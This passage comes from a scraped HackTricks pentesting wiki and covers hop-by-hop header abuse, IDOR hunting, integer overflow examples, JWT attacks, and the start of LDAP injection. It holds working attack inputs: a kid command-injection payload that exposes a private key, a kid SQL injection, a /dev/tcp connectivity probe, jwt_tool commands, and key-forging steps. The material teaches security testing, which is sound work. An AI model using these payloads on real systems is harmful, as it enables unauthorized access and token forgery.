stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nHTTP Response Smuggling / Desync\nNext\n- Pentesting Web\nhop-by-hop headers\nLast modified\n2mo ago"
    },
    {
        "title": "hop-by-hop headers",
        "url": "https://book.hacktricks.xyz/pentesting-web/abusing-hop-by-hop-headers",
        "text": "hop-by-hop headers\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã‚Äã‚Äã\nRootedCON\nis the most relevant cybersecurity event in\nSpain\nand one of the most important in\nEurope\n. With\nthe mission of promoting technical knowledge\n, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.\nRootedCON\nRootedCON\nWhat is a hop-by-hop header?\nA hop-by-hop header is a header which is designed to be processed and consumed by the proxy currently handling the request, as opposed to an end-to-end header.\nAccording to\nRFC 2616\n, the HTTP/1.1 spec treats the following headers as hop-by-hop by default:\nKeep-Alive\n,\nTransfer-Encoding\n,\nTE\n,\nConnection\n,\nTrailer\n,\nUpgrade\n,\nProxy-Authorization\nand\nProxy-Authenticate\n. When encountering these headers in a request, a compliant proxy should process or action whatever it is these headers are indicating, and not forward them on to the next hop.\nFurther to these defaults, a request\nmay also define a custom set of headers to be treated as hop-by-hop\nby adding them to the\nConnection\nheader, like so:\nConnection: close, X-Foo, X-Bar\nThe theory on abusing hop-by-hop headers\nIn theory, proxies should remove hop-by-hop headers received before sending them to the next address. But you can find in the wild that this is done by some proxies and others just send all the headers adding its own\nConnection\nheader.\nTesting hop-by-hop deletions\nIf you find a header that makes the response of the server changes if it is set of if it is not, then you can search for hop-by-hop deletions. For example, the cookie header will make the response of the server to be dramatically different if it is set (with a valid content) and if it is not.\nSo, send a request with a valid header and with this value of the Connection header\nConnection: close, Cookie\nif the response is the same as if the cookie wasn't sent, then there is a proxy removing headers.\nYou can find if the response of the server is any different if a header is deleted using this technique using\nthis script\n. Then, if you pass in a list of known headers, such as\nthis one\n, you can observe which headers are causing effects despite not being in your original request:\nfor HEADER in $(cat headers.txt); do python poison-test.py -u \"https://target\" -x \"$HEADER\"; sleep 1; done\nThis will cycle through the entire header list and print out if its presence in the hop-by-hop list created a different status code or response body size.\nAbusing X-Forwarded-For\nIn general, proxies will add the IPs of the clients inside the\nX-Forwarded-For\nheader so the next hop will know where does the petition comes from. However, if an attacker sends a Connection value like\nConnection: close, X-Forwarded-For\nand the first proxy sends the hop-by-hop headers with their values (it sends the special Connection value), then the second value may delete the X-Forward-For header.\nAt the end, the final App won't know who sent the request and may think that it was the last proxy, and is this scenario an attacker may be able to access resources protected by IP whitelisting (maybe some\n/admin\n?).\nDepending on the system being targeted, you may also have\nForwarded\n,\nX-Real-IP\n, and a bunch of others that are less common.\nDetecting Proxies and fingerprinting services\nThis technique may be useful to detect proxies (using the cookie technique) or even to detect services. For example, if you abuse this technique to delete the header\nX-BLUECOAT-VIA\nand an error is thrown, then you have find that Bluecoat was being used.\nOther Attacks\nFor a possible DoS Cache poisoning abusing this technique read the original link\nThis could be useful in attacks that may allow you to insert new headers (low probability)\nAlso,it could be useful to bypass defensive functionalities. For example, if the lack of a header means that a request shouldn't be processed by a WAF, you could bypass a WAF with this technique.\nReferences\nAbusing HTTP hop-by-hop request headers - Nathan Davison\n‚Äã\n‚Äã\nRootedCON\nis the most relevant cybersecurity event in\nSpain\nand one of the most important in\nEurope\n. With\nthe mission of promoting technical knowledge\n, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.\\\nRootedCON\nRootedCON\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nUpgrade Header Smuggling\nNext\n- Pentesting Web\nIDOR\nLast modified\n6mo ago"
    },
    {
        "title": "IDOR",
        "url": "https://book.hacktricks.xyz/pentesting-web/idor",
        "text": "IDOR\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPost taken from\nhttps://medium.com/@vickieli/how-to-find-more-idors-ae2db67c9489\n‚Äã\nUnsuspected places to look for IDORs\nDon‚Äôt ignore encoded and hashed IDs\nWhen faced with an encoded ID, it might be possible to decode the encoded ID using common encoding schemes.\nAnd if the application is using a hashed/ randomized ID, see if the ID is predictable. Sometimes applications use algorithms that produce insufficient entropy, and as such, the IDs can actually be predicted after careful analysis. In this case, try creating a few accounts to analyze how these IDs are created. You might be able to find a pattern that will allow you to predict IDs belonging to other users.\nAdditionally, it might be possible to leak random or hashed IDs via another API endpoint, on other public pages in the application (profile page of other users, etc), or in a URL via referer.\nFor example, once I found an API endpoint that allows users to retrieve detailed direct messages through a hashed conversation ID. The request kinda looks like this:\nGET /api_v1/messages?conversation_id=SOME_RANDOM_ID\nThis seems okay at first glance since the\nconversation_id\nis a long, random, alphanumeric sequence. But I later found that you can actually find a list of conversations for each user just by using their user ID!\nGET /api_v1/messages?user_id=ANOTHER_USERS_ID\nThis would return a list of\nconversation_ids\nbelonging to that user. And the\nuser_id\nis publicly available on each user‚Äôs profile page. Therefore, you can read any user‚Äôs messages by first obtaining their user_id on their profile page, then retrieving a list of conversation_ids belonging to that user, and finally loading the messages via the API endpoint /api_v1/messages!\nIf you can‚Äôt guess it, try creating it\nIf the object reference IDs seem unpredictable, see if there is something you can do to manipulate the creation or linking process of these object IDs.\nOffer the application an ID, even if it doesn‚Äôt ask for it\nIf no IDs are used in the application generated request, try adding it to the request. Try appending\nid, user_id, message_id\nor other object reference params and see if it makes a difference to the application‚Äôs behavior.\nFor example, if this request displays all your direct messages:\nGET /api_v1/messages\nWhat about this one? Would it display another user‚Äôs messages instead?\nGET /api_v1/messages?user_id=ANOTHER_USERS_ID\nHPP (HTTP parameter pollution)\nHPP vulnerabilities (supplying multiple values for the same parameter) can also lead to IDOR. Applications might not anticipate the user submitting multiple values for the same parameter and by doing so, you might be able to bypass the access control set forth on the endpoint.\nAlthough this seems to be rare and I‚Äôve never seen it happen before, theoretically, it would look like this. If this request fails:\nGET /api_v1/messages?user_id=ANOTHER_USERS_ID\nTry this:\nGET /api_v1/messages?user_id=YOUR_USER_ID&user_id=ANOTHER_USERS_ID\nOr this:\nGET /api_v1/messages?user_id=ANOTHER_USERS_ID&user_id=YOUR_USER_ID\nOr provide the parameters as a list:\nGET /api_v1/messages?user_ids[]=YOUR_USER_ID&user_ids[]=ANOTHER_USERS_ID\nBlind IDORs\nSometimes endpoints susceptible to IDOR don‚Äôt respond with the leaked information directly. They might lead the application to leak information elsewhere instead: in export files, emails and maybe even text alerts.\nChange the request method\nIf one request method doesn‚Äôt work, there are plenty of others that you can try instead: GET, POST, PUT, DELETE, PATCH‚Ä¶\nA common trick that works is substituting POST for PUT or vice versa: the same access controls might not have been implemented!\nChange the requested file type\nSometimes, switching around the file type of the requested file may lead to the server processing authorization differently. For example, try adding .json to the end of the request URL and see what happens.\nHow to increase the impact of IDORs\nCritical IDORs first\nAlways look for IDORs in critical functionalities first. Both write and read based IDORs can be of high impact.\nIn terms of state-changing (write) IDORs, password reset, password change, account recovery IDORs often have the highest business impact. (Say, as compared to a ‚Äúchange email subscription settings‚Äù IDOR.)\nAs for non-state-changing (read) IDORs, look for functionalities that handle the sensitive information in the application. For example, look for functionalities that handle direct messages, sensitive user information, and private content. Consider which functionalities on the application makes use of this information and look for IDORs accordingly.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nhop-by-hop headers\nNext\n- Pentesting Web\nInteger Overflow\nLast modified\n6mo ago"
    },
    {
        "title": "Integer Overflow",
        "url": "https://book.hacktricks.xyz/pentesting-web/integer-overflow",
        "text": "Integer Overflow\n‚Äã\n\u0000\u0000‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nRust\nC\nfn\nmain\n()\n{\n‚Äã\nlet\nmut\nquantity\n=\n2147483647\n;\nlet\n(\nmul_result\n,\n_\n)\n=\ni32\n::\noverflowing_mul\n(\n32767\n,\nquantity\n);\nlet\n(\nadd_result\n,\n_\n)\n=\ni32\n::\noverflowing_add\n(\n1\n,\nquantity\n);\nprintln!\n(\n\"{}\"\n,\nmul_result\n);\nprintln!\n(\n\"{}\"\n,\nadd_result\n);\n}\n#\ninclude\n<stdio.h>\n#\ninclude\n<limits.h>\n‚Äã\nint\nmain\n()\n{\nint\na\n=\nINT_MAX\n;\nint\nb\n=\n0\n;\nint\nc\n=\n0\n;\nb\n=\na\n*\n100\n;\nc\n=\na\n+\n1\n;\nprintf\n(\n\"%d\\n\"\n,\nINT_MAX\n);\nprintf\n(\n\"%d\\n\"\n,\nb\n);\nprintf\n(\n\"%d\\n\"\n,\nc\n);\nreturn\n0\n;\n}\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nIDOR\nNext\n- Pentesting Web\nJWT Vulnerabilities (Json Web Tokens)\nLast modified\n6mo ago"
    },
    {
        "title": "JWT Vulnerabilities (Json Web Tokens)",
        "url": "https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens",
        "text": "JWT Vulnerabilities (Json Web Tokens)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\nPart of this post was taken from:\nhttps://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology\nAuthor of the great tool to pentest JWTs\nhttps://github.com/ticarpi/jwt_tool\n‚Äã\nQuick Wins\nRun\njwt_tool\nwith mode\nAll Tests!\nand wait for green lines\npython3 jwt_tool.py\n-M\nat\n\\\n-t\n\"https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245\"\n\\\n-rh\n\"Authorization: Bearer eyJhbG...<JWT Token>\"\nIf you are lucky the tool will find some case where the web application is incorrectly checking the JWT:\nThen, you can search the request in your proxy or dump the used JWT for that request using jwt_ tool:\npython3 jwt_tool.py\n-Q\n\"jwttool_706649b802c9f5e41052062a3787b291\"\nTamper data without modifying anything\nYou can just tamper with the data leaving the signature as is and check if the server is checking the signature. Try to change your username to \"admin\" for example.\nIs the token checked?\nIf an error message occurs the signature is being checked - read any verbose error info that might leak something sensitive.\nIf the page returned is different the signature is being checked.\nIf the page is the same then the signature is not being checked - time to start tampering the Payload claims to see what you can do!\nOrigin\nCheck where the token originated in your proxy's request history. It should be created on the server, not the client.\nIf it was first seen coming from the client-side then the\nkey\nis accessible to client-side code - seek it out!\nIf it was first seen coming from the server then all is well.\nDuration\nCheck if the token lasts more than 24h... maybe it never expires. If there is a \"exp\" filed, check if the server is correctly handling it.\nBrute-force HMAC secret\n‚Äã\nSee this page.\n‚Äã\nModify the algorithm to None (CVE-2015-9235)\nSet the algorithm used as \"None\" and remove the signature part.\nUse the Burp extension call \"JSON Web Token\" to try this vulnerability and to change different values inside the JWT (send the request to Repeater and in the \"JSON Web Token\" tab you can modify the values of the token. You can also select to put the value of the \"Alg\" field to \"None\").\nChange the algorithm RS256(asymmetric) to HS256(symmetric) (CVE-2016-5431/CVE-2016-10555)\nThe algorithm HS256 uses the secret key to sign and verify each message.\nThe algorithm RS256 uses the private key to sign the message and uses the public key for authentication.\nIf you change the algorithm from RS256 to HS256, the back end code uses the public key as the secret key and then uses the HS256 algorithm to verify the signature.\nThen, using the public key and changing RS256 to HS256 we could create a valid signature. You can retrieve the certificate of the web server executing this:\nopenssl s_client\n-connect\nexample.com:443\n2\n>\n&1\n<\n/dev/null\n|\nsed\n-n\n'/-----BEGIN/,/-----END/p'\n>\ncertificatechain.pem\n#For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the \"non\" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.\nopenssl x509\n-pubkey\n-in\ncertificatechain.pem\n-noout\n>\npubkey.pem\nNew public key inside the header\nAn attacker embeds a new key in the header of the token and the server uses this new key to verify the signature (CVE-2018-0114).\nThis can be done with the \"JSON Web Tokens\" Burp extension.\n(Send the request to the Repeater, inside the JSON Web Token tab select \"CVE-2018-0114\" and send the request).\nJWKS Spoofing\nIf the token uses a ‚Äújku‚Äù Header claim then check out the provided URL. This should point to a URL containing the JWKS file that holds the Public Key for verifying the token. Tamper the token to point the jku value to a web service you can monitor traffic for.\nIf you get an HTTP interaction you now know that the server is trying to load keys from the URL you are supplying.\nUse jwt_tool's -S flag alongside the -u\nhttp://example.com\nargument to generate a new key pair, inject your provided URL, generate a JWKS containing the Public Key, and sign the token with the Private Key\nKid issues\nkid\nis an optional header claim which holds a key identifier, particularly useful when you have multiple keys to sign the tokens and you need to look up the right one to verify the signature.\n\"kid\" issues - reveal key\nIf the claim \"kid\" is used in the header, check the web directory for that file or a variation of it. For example if\n\"kid\":\"key/12345\"\nthen look for\n/key/12345\nand\n/key/12345.pem\non the web root.\n\"kid\" issues - path traversal\nIf the claim \"kid\" is used in the header, check if you can use a different file in the file system. Pick a file you might be able to predict the content of, or maybe try\n\"kid\":\"/dev/tcp/yourIP/yourPort\"\nto test connectivity, or even some\nSSRF\npayloads...\nUse jwt_tool's -T flag to tamper the JWT and change the value of the kid claim, then choose to keep the original signature\npython3 jwt_tool.py\n<\nJWT\n>\n-I\n-hc\nkid\n-hv\n\"../../dev/null\"\n-S\nhs256\n-p\n\"\"\nUsing files inside the host with known content you can also forge a valid JWT. For example, in linux systems the file\n/proc/sys/kernel/randomize_va_space\nhas the value set to\n2\n. So, putting that\npath\ninside the \"\nkid\n\" parameter and using \"\n2\n\" as the\nsymetric password\nto generate the JWT you should be able to generate a valid new JWT.\n\"kid\" issues - SQL Injection\nIn a scenario wehre the content of the \"kid\" is used to retreive the password from the database, you could change the payload inside the \"kid\" parameter to:\nnon-existent-index' UNION SELECT 'ATTACKER';-- -\nand then sign the JWT with the secret key\nATTACKER\n.\n\"kid\" issues - OS Injection\nIn a scenario where the \"kid\" parameter contains a path to the file with the key and this path is being used\ninside an executed command\nyou could be able to obtain RCE and expose the private key with a payload like the following:\n/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&\nMiscellaneous attacks\nThe following are known weaknesses that should be tested for.\nCross-service relay attacks\nSome web applications use a trusted JWT ‚Äòservice‚Äô to generate and manage tokens for them. In the past some instances have occurred where a token generated for one of the JWT services‚Äô clients can actually be accepted by another of the JWT services‚Äô clients.\nIf you observe the JWT being issued or renewed via a third-party service then it is worth identifying if you can sign up for an account on another of that service‚Äôs clients with your same username/email. If so try taking that token and replaying it in a request to your target. Is it accepted?\nIf your token is accepted then you may have a critical issue allowing you to spoof any user‚Äôs account. HOWEVER, be aware that if you are signing up on a third party application you may need to seek permission for wider testing permissions in case it enters a legal grey-area!\nIs exp checked?\nThe ‚Äúexp‚Äù Payload claim is used to check the expiry of a token. As JWTs are often used in the absence of session information, so they do need to be handled with care - in many cases capturing and replaying someone else‚Äôs JWT will allow you to masquerade as that user.\nOne mitigation against JWT replay attacks (that is advised by the JWT RFC) is to use the ‚Äúexp‚Äù claim to set an expiry time for the token. It is also important to set the relevant checks in place in the application to make sure this value is processed and the token rejected where it is expired. If the token contains an ‚Äúexp‚Äù claim and test time limits permit it - try storing the token and replaying it after the expiry time has passed.\nUse jwt_tool's -R flag to read the content of the token, which includes timestamp parsing and expiry checking (timestamp in UTC)\nIf the token still validates in the application then this may be a security risk as the token may NEVER expire.\nx5u and jku\njku\njku stands for\nJWK Set URL\n.\nIf the token uses a ‚Äú\njku\n‚Äù\nHeader\nclaim then\ncheck out the provided URL\n. This should point to a URL containing the JWKS file that holds the Public Key for verifying the token. Tamper the token to point the jku value to a web service you can monitor traffic for.\nFirst you need to create a new certificate with new private & public keys\nopenssl genrsa\n-out\nkeypair.pem\n2048\nopenssl rsa\n-in\nkeypair.pem\n-pubout\n-out\npublickey.crt\nopenssl pkcs8\n-topk8\n-inform\nPEM\n-outform\nPEM\n-nocrypt\n-in\nkeypair.pem\n-out\npkcs8.key\nThen you can use for example\njwt.io\nto create the new JWT with the\ncreated public and private keys and pointing the parameter jku to the certificate created.\nIn order to create a valid jku certificate you can download the original one anche change the needed parameters.\nYou can obtain the parametes \"e\" and \"n\" from a public certificate using:\nfrom Crypto.PublicKey\nimport\nRSA\nfp\n=\nopen\n(\n\"publickey.crt\"\n,\n\"r\"\n)\nkey\n=\nRSA.importKey\n(\nfp.read\n())\nfp.close\n()\nprint\n(\n\"n:\"\n, hex\n(\nkey.n\n))\nprint\n(\n\"e:\"\n, hex\n(\nkey.e\n))\nx5u\nX.509 URL. A URI pointing to a set of X.509 (a certificate format standard) public certificates encoded in PEM form. The first certificate in the set must be the one used to sign this JWT. The subsequent certificates each sign the previous one, thus completing the certificate chain. X.509 is defined in RFC 52807 . Transport security is required to transfer the certificates.\nTry to\nchange this header to an URL under your control\nand check if any request is received. In that case you\ncould tamper the JWT\n.\nTo forge a new token using a certificate controlled by you, you need to create the certificate and extract the public and private keys:\nopenssl req\n-x509\n-nodes\n-days\n365\n-newkey\nrsa:2048\n-keyout\nattacker.key\n-out\nattacker.crt\nopenssl x509\n-pubkey\n-noout\n-in\nattacker.crt\n>\npublicKey.pem\nThen you can use for example\njwt.io\nto create the new JWT with the\ncreated public and private keys and pointing the parameter x5u to the certificate .crt created.\nYou can also abuse both of these vulns\nfor SSRFs\n.\nx5c\nThis parameter may contain the\ncertificate in base64\n:\nIf the attacker\ngenerates a self-signed certificate\nand creates a forged token using the corresponding private key and replace the \"x5c\" parameter‚Äôs value with the newly generatedcertificate and modifies the other parameters, namely n, e and x5t then essentially the forgedtoken would get accepted by the server.\nopenssl req\n-x509\n-nodes\n-days\n365\n-newkey\nrsa:2048\n-keyout\nattacker.key\n-outattacker.crt\nopenssl x509\n-in\nattacker.crt\n-text\nEmbedded Public Key (CVE-2018-0114)\nIf the JWT has embedded a public key like in the following scenario:\nUsing the following nodejs script it's possible to generate a public key from that data:\nconst NodeRSA\n=\nrequire\n(\n'node-rsa'\n);\nconst fs\n=\nrequire\n(\n'fs'\n);\nn\n=\n\"‚ÄãANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8\"\n‚Äã\n;\ne\n=\n\"AQAB\"\n;\nconst key\n=\nnew NodeRSA\n();\nvar importedKey\n=\nkey.importKey\n({\nn: Buffer.from\n(\nn,\n'base64'\n)\n,e: Buffer.from\n(\ne,\n'base64'\n)\n,\n}\n,\n'components-public'\n);\nconsole.log\n(\nimportedKey.exportKey\n(\n\"public\"\n));\nIt's possible to generate a new private/public key, embeded the new public key inside the token and use it to generate a new signature:\nopenssl genrsa\n-out\nkeypair.pem\n2048\nopenssl rsa\n-in\nkeypair.pem\n-pubout\n-out\npublickey.crt\nopenssl pkcs8\n-topk8\n-inform\nPEM\n-outform\nPEM\n-nocrypt\n-in\nkeypair.pem\n-out\npkcs8.key\nYou can obtain the \"n\" and \"e\" using this nodejs script:\nconst NodeRSA\n=\nrequire\n(\n'node-rsa'\n);\nconst fs\n=\nrequire\n(\n'fs'\n);\nkeyPair\n=\nfs.readFileSync\n(\n\"keypair.pem\"\n);\nconst key\n=\nnew NodeRSA\n(\nkeyPair\n);\nconst publicComponents\n=\nkey.exportKey\n(\n'components-public'\n);\nconsole.log\n(\n'Parameter n: '\n, publicComponents.n.toString\n(\n\"hex\"\n));\nconsole.log\n(\n'Parameter e: '\n, publicComponents.e.toString\n(\n16\n));\nFinally, using the public and private key and the new \"n\" and \"e\" values you can use\njwt.io\nto forge a new valid JWT with any information.\nJTI (JWT ID)\nThe JTI (JWT ID) claim provides a unique identifier for a JWT Token. It can beused to prevent the token from being replayed.\nHowever, imagine a situation where the maximun length of the ID is 4 (0001-9999). The request 0001 and 10001 are going to use the same ID. So if the backend is incrementig the ID on each request you could abuse this to\nreplay a request\n(needing to send 10000 request between each successful replay).\nJWT Registered claims\nJSON Web Token (JWT)\nTools\nGitHub - ticarpi/jwt_tool: A toolkit for testing, tweaking and cracking JSON Web Tokens\nGitHub\n‚Äã\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nInteger Overflow\nNext\n- Pentesting Web\nLDAP Injection\nLast modified\n3mo ago"
    },
    {
        "title": "LDAP Injection",
        "url": "https://book.hacktricks.xyz/pentesting-web/ldap-injection",
        "text": "LDAP Injection\nLDAP Injection\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\nLDAP Injection\nLDAP\nIf you want to know what is LDAP access the following page:\n389, 636, 3268, 3269 - Pentesting LDAP\nLDAP Injection\nis an attack used to\nexploit\nweb\nbased applications that construct\nLDAP\nstatements\nbased on\nuser\ninput\n. When an application\nfails\nto properly\nsanitize\nuser input, it's possible to modify LDAP statements using a local proxy.\nEN-Blackhat-Europe-2008-LDAP-Injection-Blind-LDAP-Injection.pdf\n2MB\nPDF\nFilter\n= ( filtercomp )\nFiltercomp\n= and / or / not / item\nAnd\n= & filterlist\nOr\n= |filterlist\nNot\n= ! filter\nFilterlist\n= 1*filter\nItem\n= simple / present / substring\nSimple\n= attr filtertype assertionvalue\nFiltertype\n=\n'=' / '~=' / '>=' / '<='\nPresent\n= attr = *\nSubstring\n= attr ‚Äù=‚Äù [initial] * 